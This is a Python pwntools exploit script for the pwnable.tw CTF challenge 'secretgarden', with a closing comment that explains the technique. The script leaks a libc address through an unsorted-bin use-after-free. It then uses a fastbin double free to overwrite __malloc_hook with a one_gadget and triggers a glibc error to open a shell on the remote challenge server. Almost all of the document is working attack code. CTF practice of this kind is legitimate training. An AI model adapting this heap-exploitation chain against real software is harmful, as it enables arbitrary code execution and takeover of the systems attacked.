from pwn import *
import sys
# context.log_level = 'debug' 

elf = ELF('secretgarden')
if sys.argv[1] == 'r':
    p = remote('chall.pwnable.tw', 10203)
    libc = ELF('libc_64.so.6')
    one_gadgets = [0x45216, 0x4526a, 0xef6c4, 0xf0567]
    offset_libc = 0x3c3b78
elif sys.argv[1] == 'l':
    p = process('./secretgarden_local', aslr=True, env={"LD_PRELOAD":"libc-2.23.so"})
    libc = ELF('libc-2.23.so')
    one_gadgets = [ 0x4527a, 0xf0364,0x45226, 0xf1207]
    offset_libc = 0x3c4b78
    context.terminal = ['tmux', 'splitw', '-h']
    gdb.attach(proc.pidof(p)[0], gdbscript='''
                                        continue
                                        ''')

def raise_flower(length, name, color):
    p.sendafter("choice : ", "1")
    p.sendlineafter("Length of the name :", str(length))
    p.sendafter("The name of flower :", name)
    p.sendlineafter("The color of the flower :", color)

def visit():
    p.sendafter("choice : ", "2")

def remove(index):
    p.sendafter("choice : ", "3")
    p.sendlineafter("Which flower do you want to remove from the garden:", str(index))

def clean():
    p.sendafter("choice : ", "4")

def solve():
    # place unsorted bin and free
    raise_flower(0x500, "A", "A") # chunk to push to unsorted bin -  flower[0]
    raise_flower(0x20, "B", "B")  # avoid merge to top chunk     - flower[1]
    remove(0)                     # free chunk 0x500 to unsorted bin                             
    raise_flower(0x20, "C"*0x8, "C")         # uaf to leak libc  - flower[2]

    # leak libc
    visit()
    p.recvuntil("C"*0x8)
    libc.address = u64(p.recv(6).ljust(8, "\x00")) - offset_libc
    malloc_hook = libc.symbols["__malloc_hook"]
    realloc_hook = libc.symbols["__realloc_hook"]
    one_gadget = libc.address + one_gadgets[2]
    success("libc address: %s"%(hex(libc.address)))
    success("malloc hook:  %s"%(hex(malloc_hook)))
    success("realloc hook: %s"%(hex(realloc_hook)))
    success("one gadget:   %s"%hex(one_gadget))

    # create chunk with fastbin size
    raise_flower(0x67, "G", "G")  #     flower[3]
    raise_flower(0x67, "H", "H")  #     flower[4]

    # double free
    remove(3)
    remove(4)
    remove(3)

    raise_flower(0x67, p64(malloc_hook-0x23), "B")  # write fd to malloc_hook-0x23 
    raise_flower(0x67, "B", "B")  
    raise_flower(0x67, "B", "B")  

    raise_flower(0x67, 'A'*19 + p64(one_gadget) , "B")  # overwrite malloc_hook-0x23 with one_gadget

    # pop shell in local
    # raise_flower(0x10, "A","A")    
     
    # double free trigger printerr => pop shell in remote
    remove(1)
    remove(1)

    p.interactive()

if __name__ == '__main__':
    solve()


"""
note:
_ function remove_flower free chunk name of flower but doesnt set the pointer to NULL => double free
_ doublefree fastbin protection in glibc 2.23 can be easily bypassed by free chunk A then free B then back to free A  
_ unsorted bin can leak libc and heap base 
_ double free in fastbin => overwrite malloc_hook
_ double free can trigger printerr => malloc_hook
"""